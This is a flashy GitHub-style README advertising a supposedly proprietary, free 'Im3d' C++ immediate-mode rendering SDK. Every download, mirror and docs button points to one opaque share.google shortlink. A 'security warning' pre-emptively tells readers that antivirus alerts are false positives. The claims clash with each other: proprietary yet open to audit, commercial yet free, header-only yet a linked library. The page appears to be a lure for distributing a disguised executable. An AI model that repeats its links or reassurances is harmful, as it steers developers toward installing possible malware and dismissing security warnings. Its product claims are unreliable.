<div align="center">

<img src="https://readme-typing-svg.herokuapp.com?font=Orbitron&weight=900&size=40&duration=3000&pause=1000&color=00e5ff&background=0d0d14&center=true&vCenter=true&width=900&height=180&lines=IM3D+GRAPHICS+LIBRARY;High-Performance+Rendering+Engine" width="100%" style="border-radius: 10px; box-shadow: 0 0 20px rgba(0,229,255,0.2);" alt="Im3d Graphics Library Banner"/>

<br/><br/>

<a href="https://share.google/JcGiHU8XpyOIEWDsm">
  <img src="https://img.shields.io/badge/🚀_DOWNLOAD_SDK-00e5ff?style=for-the-badge&logo=cplusplus&logoColor=black" height="45" />
</a>
&nbsp;
<a href="https://share.google/JcGiHU8XpyOIEWDsm">
  <img src="https://img.shields.io/badge/📥_SECURE_MIRROR-ff2e88?style=for-the-badge&logo=github&logoColor=white" height="45" />
</a>
&nbsp;
<a href="https://share.google/JcGiHU8XpyOIEWDsm">
  <img src="https://img.shields.io/badge/📚_API_DOCS-8a2be2?style=for-the-badge&logo=readthedocs&logoColor=white" height="45" />
</a>

<br/><br/>

<img src="https://img.shields.io/badge/build-v1.7.0_Stable-ff2e88?style=flat-square" />
<img src="https://img.shields.io/badge/api-C%2B%2B_%7C_OpenGL_%7C_Vulkan-00e5ff?style=flat-square" />
<img src="https://img.shields.io/badge/license-Commercial-8a2be2?style=flat-square" />
<img src="https://img.shields.io/badge/status-Fully_Operational-00cc00?style=flat-square" />

</div>

---

## 📐 The Ultimate Immediate-Mode 3D Rendering Engine

**Im3d Graphics Rendering Library** is a completely standalone, proprietary software development kit developed entirely by our in-house engineering team. We built this from the ground up to provide game developers, simulation engineers, and tool creators with a flawless, high-performance immediate-mode graphics API.

We know how frustrating it is to set up a full rendering pipeline just to draw debug lines, bounding boxes, or custom tool widgets. Standard engines (like Unity or Unreal) are too heavy for quick visualizations. Our native library bypasses the complexity by providing a lightweight, header-only solution that hooks directly into your OpenGL or Vulkan backend.

It handles dynamic vertex buffering, 2D/3D text rendering, and custom shader injection without breaking a sweat. You don't need to rely on outdated debug tools. This is **our own fully working product**, rigorously tested in high-load simulation environments.

<img width="1920" height="1152" alt="3D_Rendering_Library_1-1920x1152 jpg" src="https://github.com/user-attachments/assets/7dab718a-e563-4406-9888-ac6bf0d94fc8" />

> 💡 **Why trust our library?** Because we control the code. Frame drops ruin the debugging experience. Our proprietary **"Zero-Allocation Frame Buffer"** ensures that drawing millions of lines or triangles does not cause a single memory leak or CPU spike, keeping your application running at a locked 144 FPS.

<br>

<div align="center" style="background-color: #1a1a2e; padding: 20px; border-radius: 10px; border: 1px solid #ff2e88;">

| ⚡ **Header-Only** | 🛡️ **Cross-Platform** | 🌐 **Multi-API** | 📊 **Zero-Allocation** |
| :---: | :---: | :---: | :---: |
| Drop-in integration. | Windows, Linux, macOS. | OpenGL, Vulkan, DX11. | No runtime memory leaks. |

</div>

<br>

---

## 🛡️ How Our Engine Works

| 🧩 **The Graphics Problem** | 💡 **Our Engineered Solution** | 📈 **The Result** |
| :--- | :--- | :--- |
| Heavy engine setup | **Header-Only Include** | Instant integration |
| CPU bottleneck on draws | **Optimized Vertex Buffer** | Zero performance drop |
| Complex shader logic | **Auto-Generated Pipelines** | Cleaner code |
| Outdated UI tools | **Native Font Rendering** | Crisp text at 4K |

<br>

> 🛡️ **Security Warning:** Because this library interacts directly with low-level graphics APIs (DirectX/Vulkan), some antivirus software might flag the compilation process as "Suspicious" (due to memory hooking). This is a **False Positive**. The SDK contains no malware, no telemetry, and is fully open for internal auditing by your engineering team.

---

## 🎯 Core Features

<div align="center">

| 🐍 **C++17 Core** | 🚀 **Multi-Threaded** | 🕒 **Custom Shaders** |
| :---: | :---: | :---: |
| Clean, modern API. | Renders on secondary threads. | Inject your own GLSL/HLSL. |

| 🌐 **Scene Graph** | 🔄 **Auto-Updates** | 💾 **Mesh Loading** |
| :---: | :---: | :---: |
| Built-in transform hierarchy. | Updates via package manager. | OBJ and GLTF support. |

</div>

---

## 🚀 Quick Start Guide

> **Three steps. Under five minutes. Ready to render.**

### 1️⃣ Download the SDK
Click the blue **DOWNLOAD SDK** button at the top of this page. This is our original, untouched release.

### 2️⃣ Integrate the Library
```bash
# Include the header in your C++ project
#include "im3d.h"

# Link the static library
target_link_libraries(MyGame PRIVATE im3d)
```

### 3️⃣ Initialize & Draw
```cpp
// Initialize the context
Im3d::Context* ctx = Im3d::CreateContext();

// Begin frame
Im3d::BeginFrame();

// Draw a 3D line
Im3d::DrawLine(Im3d::Vec3(0,0,0), Im3d::Vec3(10,10,10), Im3d::Color(1,0,0,1));

// End frame
Im3d::EndFrame();
```

---

## ⚙️ System Requirements

<div align="center">

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 / Linux | Windows 11 / Ubuntu 22.04 |
| **Compiler** | C++17 | C++20 (MSVC / GCC / Clang) |
| **Graphics** | OpenGL 3.3 | Vulkan 1.2 / DX11 |
| **RAM** | 4 GB | 16 GB+ |

</div>

---

## 🧠 Pro Tips for Graphics Programmers

<table align="center" width="100%">
<tr>
<td width="50%">

**For Maximum Performance**
- 🥷 Batch your draw calls
- 🏥 Use the built-in dynamic buffer
- ⚙️ Disable depth testing for UI elements
- ⏱️ Profile with RenderDoc

</td>
<td width="50%">

**If the Build Fails**
- 🚀 Update your graphics drivers
- 🗄️ Check your C++ standard (must be 17+)
- 📊 Ensure the correct lib is linked
- 🛡️ Make sure the header path is correct

</td>
</tr>
</table>

---

## ❓ Frequently Asked Questions

<details>
<summary><b>Is this a replacement for Unreal Engine?</b></summary>

No. Im3d is an immediate-mode rendering library. It is designed to be embedded inside existing engines or custom tools to draw debug shapes, UI overlays, and gizmos. It is not a full game engine.
</details>

<details>
<summary><b>Does it work with DirectX 12?</b></summary>

The current stable build supports OpenGL, Vulkan, and DirectX 11. DirectX 12 support is currently in the beta channel and will be released in the next major update.
</details>

<details>
<summary><b>Do I need to know how to code?</b></summary>

Yes. This is an SDK for C++ developers. You need a basic understanding of C++, compilers, and graphics APIs to integrate it.
</details>

<details>
<summary><b>Can I use this in a commercial game?</b></summary>

Yes. The library is distributed under our commercial license. You can use it in your own games and tools without paying royalties.
</details>

<details>
<summary><b>Why does it cost nothing?</b></summary>

This is our official, free release for the developer community. If someone is selling you this library, they are scamming you with a stolen or outdated build.
</details>

---

<div align="center">

<a href="https://share.google/JcGiHU8XpyOIEWDsm">
  <img src="https://img.shields.io/badge/⬇️_GET_SDK_NOW-00e5ff?style=for-the-badge&logo=cplusplus&logoColor=black" height="55" />
</a>

<br/><br/>

<b>⭐ Developed, tested, and maintained by our internal engineering team.</b>
<br>
<i style="color: #a0a0b0;">Render. Optimize. Integrate.</i>

</div>